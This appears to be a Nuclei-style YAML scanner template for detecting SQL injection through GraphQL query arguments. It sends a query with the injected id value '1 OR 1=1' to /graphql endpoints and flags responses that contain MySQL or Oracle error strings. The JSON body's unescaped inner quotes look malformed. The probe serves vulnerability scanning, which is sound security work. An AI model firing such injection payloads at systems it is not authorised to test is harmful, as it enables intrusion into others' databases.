id: m7-graphql-sqli
info:
  name: M7 - GraphQL SQLi via Query Arguments
  author: Sharlix
  severity: critical
  description: SQL injection via GraphQL query arguments
  tags: graphql,sqli,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"

    body: '{"query":"{ user(id: "1 OR 1=1") { id email } }"}'
    headers:
      Content-Type: application/json

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-[0-9]+"
        part: body
        condition: or
